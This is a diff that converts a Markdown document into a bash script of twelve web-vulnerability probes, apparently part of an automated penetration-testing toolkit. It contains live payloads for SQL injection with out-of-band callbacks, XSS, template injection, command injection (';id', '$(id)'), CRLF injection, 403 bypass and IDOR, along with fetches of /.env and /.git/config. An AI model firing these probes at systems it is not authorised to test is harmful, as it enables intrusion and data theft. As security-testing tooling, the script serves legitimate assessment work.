@@ -1,18 +1,12 @@
-# Tier 1 — 通用探针（12 个，永远跑，~60s）
+#!/usr/bin/env bash
+# tier1_universal.sh — Tier 1 通用探针（12 个，永远跑）
+#
+# 用法：
+#   source probes/tier1_universal.sh   # 注册函数（零副作用）
+#   run_probes_tier1                    # 执行
+#
+# 依赖：$TMP / $SHARED（由 infra/directory_setup.md 的 init_hackprobe_dir 导出）
 
-> **Wave 3 核心引擎。** 每个探针是一个 bash 函数，命中→加载 hack-skills 深度技能，未命中→零开销。
->
-> **契约**：`source` 本文件 = 注册函数（含下面的 preamble 建立 $HITS_FILE）；
-> 然后调 `run_probes_tier1` 执行。**不要在 source 时直接跑探针。**
->
-> **路径**：`$TMP` / `$SHARED` 由 `infra/directory_setup.md` 的 `init_hackprobe_dir` 导出。
-> 未初始化时下面有 fallback，但会警告。
-
----
-
-## Preamble — 环境与辅助函数
-
-```bash
 # ====== 路径 fallback（正常流程由 init_hackprobe_dir 导出）======
 if [ -z "${SHARED:-}" ] || [ -z "${TMP:-}" ]; then
   echo "[probes] WARN: \$SHARED/\$TMP 未定义 —— 请先 source infra/directory_setup.md 并调 init_hackprobe_dir" >&2
@@ -100,13 +94,6 @@ for post_url in $(grep -iE '/api/|/graphql|/login|/register|/upload|/submit|/sea
                     "$SHARED/urls_all.txt" 2>/dev/null | head -5); do
   POST_ENDPOINTS="$POST_ENDPOINTS $post_url"
 done
-```
-
----
-
-## P1. SQLi — Boolean Blind + Time-Based + OOB
-
-```bash
 P1_SQLi() {
   local url true_sz false_sz diff pct start_ms elapsed
 
@@ -115,7 +102,7 @@ P1_SQLi() {
     [ -z "$url" ] && continue
     true_sz=$(curl -sk "$url AND 1=1--" -w "%{size_download}" -o /dev/null --max-time 5)
     false_sz=$(curl -sk "$url AND 1=2--" -w "%{size_download}" -o /dev/null --max-time 5)
-    if [ "$true_sz" != "$false_sz" ] && [ "${true_sz:-0}" -gt 0 ]; then
+    if [ "$true_sz" != "$false_sz" ] && (( ${true_sz:-0} > 0 )); then
       diff=$(( true_sz > false_sz ? true_sz - false_sz : false_sz - true_sz ))
       pct=$(( diff * 100 / (true_sz > false_sz ? true_sz : false_sz) ))
       if [ "$pct" -gt 10 ]; then
@@ -162,11 +149,6 @@ P1_SQLi() {
     echo "[P1] OOB probes sent to ${OAST_DOMAIN} — check interactsh for callbacks"
   fi
 }
-```
-
-## P2. XSS — Reflection Check
-
-```bash
 P2_XSS() {
   local param resp
   local payload_enc="%3Cscript%3Ealert(1)%3C%2Fscript%3E"
@@ -180,11 +162,6 @@ P2_XSS() {
       record_hit "P2" "xss-cross-site-scripting" "Partial reflection: param=$param"
   done
 }
-```
-
-## P3. SSTI — Polyglot + Double-Check
-
-```bash
 P3_SSTI() {
   local param payload encoded encoded2 resp resp2 found=0
   # 多引擎 polyglot: Jinja2 / Twig / EJS / Pug / Smarty / Freemarker / Velocity
@@ -222,11 +199,6 @@ P3_SSTI() {
       record_hit "P3" "ssti-server-side-template-injection" "Twig _self object exposed"
   fi
 }
-```
-
-## P4. CMDi — Command Injection
-
-```bash
 P4_CMDi() {
   local param resp
   local payloads=(';id' '|id' '$(id)' '`id`' '&id')
@@ -245,11 +217,6 @@ P4_CMDi() {
     }
   done
 }
-```
-
-## P5. CORS — 3-Vector
-
-```bash
 P5_CORS() {
   local resp acao acac null_acao
   # V1: 任意 Origin + credentials
@@ -269,11 +236,6 @@ P5_CORS() {
   [[ "$acao" == *"*"* && "$acac" == *"true"* ]] && \
     record_hit "P5" "cors-cross-origin-misconfiguration" "Wildcard + credentials — universal CORS bypass"
 }
-```
-
-## P6. Open Redirect
-
-```bash
 P6_OpenRedirect() {
   local param location
   for param in url next return returnUrl goto target redirect destination continue to out; do
@@ -285,11 +247,6 @@ P6_OpenRedirect() {
     fi
   done
 }
-```
-
-## P7. Sensitive Files
-
-```bash
 P7_SensitiveFiles() {
   local path status size
   for path in /.env /.git/config /.git/HEAD /.svn/entries /robots.txt /sitemap.xml \
@@ -300,7 +257,7 @@ P7_SensitiveFiles() {
     status=$(curl -sk -o /dev/null -w "%{http_code}" -L --max-redirs 2 "${URL}${path}" --max-time 4 2>/dev/null)
     size=$(curl -sk -w "%{size_download}" -o /dev/null "${URL}${path}" --max-time 4 2>/dev/null)
     # 两个门控都要过：200 且 >20 字节（否则空 200 页会全量误报）
-    if [[ "$status" == "200" && "${size:-0}" -gt 20 ]]; then
+    if [[ "$status" == "200" ]] && (( ${size:-0} > 20 )); then
       case "$path" in
         /.git/*|/.svn/*)
           record_hit "P7" "insecure-source-code-management" "$path accessible: $status/${size}b" ;;
@@ -318,11 +275,6 @@ P7_SensitiveFiles() {
     fi
   done
 }
-```
-
-## P8. HTTP Methods — Dangerous
-
-```bash
 P8_HTTPMethods() {
   local method status up_path up_status
   for method in PUT DELETE PATCH; do
@@ -342,11 +294,6 @@ P8_HTTPMethods() {
     fi
   done
 }
-```
-
-## P10. CRLF Header 注入
-
-```bash
 P10_CRLF() {
   local crlf_resp
   crlf_resp=$(curl -sk -I "${URL}?q=%0d%0aX-CRLF-Test:%20injected" --max-time 5 2>/dev/null)
@@ -354,11 +301,6 @@ P10_CRLF() {
   echo "$crlf_resp" | grep -qi "X-CRLF-Test: injected" && \
     record_hit "P10" "crlf-injection" "CRLF header injection confirmed"
 }
-```
-
-## P11. 403 Bypass — Header + Path Fuzzing
-
-```bash
 P11_403Bypass() {
   local header h_name bypass_status path base_code variant fuzz_code
 
@@ -390,11 +332,6 @@ P11_403Bypass() {
     done
   done
 }
-```
-
-## P12. IDOR — Sequential ID 探测
-
-```bash
 P12_IDOR() {
   local url base sz1 sz3
   while IFS= read -r url; do
@@ -405,20 +342,14 @@ P12_IDOR() {
     sz1=$(curl -sk "${base/X/1}" -w "%{size_download}" -o /dev/null --max-time 5 2>/dev/null)
     sz3=$(curl -sk "${base/X/3}" -w "%{size_download}" -o /dev/null --max-time 5 2>/dev/null)
     # 两个响应都要 >100 字节且大小不同，才视为越权信号
-    if [ "$sz1" != "$sz3" ] && "${sz1:-0}" -gt 100 && "${sz3:-0}" -gt 100; then
+    # （注意：算术比较不能给数字加引号，否则 bash 会当成命令去执行）
+    if [ "$sz1" != "$sz3" ] && (( ${sz1:-0} > 100 && ${sz3:-0} > 100 )); then
       record_hit "P12" "idor-broken-object-authorization" \
         "Response differs for ID 1 vs 3 at $url: ${sz1}b vs ${sz3}b"
       return 0
     fi
   done < <(grep -iE '[?&](id|uid|user_id|uuid)=' "$SHARED/params_idor.txt" 2>/dev/null | head -5)
 }
-```
-
----
-
-## P12.5 — POST Body Injection
-
-```bash
 P12_5_POST_Body() {
   local post_url resp status
   for post_url in $POST_ENDPOINTS; do
@@ -458,13 +389,6 @@ P12_5_POST_Body() {
     break   # 只测第一个 POST 端点，省时间
   done
 }
-```
-
----
-
-## Tier 1 执行入口
-
-```bash
 run_probes_tier1() {
   echo "[probes] ====== $(date +%H:%M:%S) Tier 1: Universal (12 probes) ======"
 
@@ -491,4 +415,3 @@ try:
 except Exception:
     print(0)' "$HITS_FILE" 2>/dev/null || echo 0) hits"
 }
-```
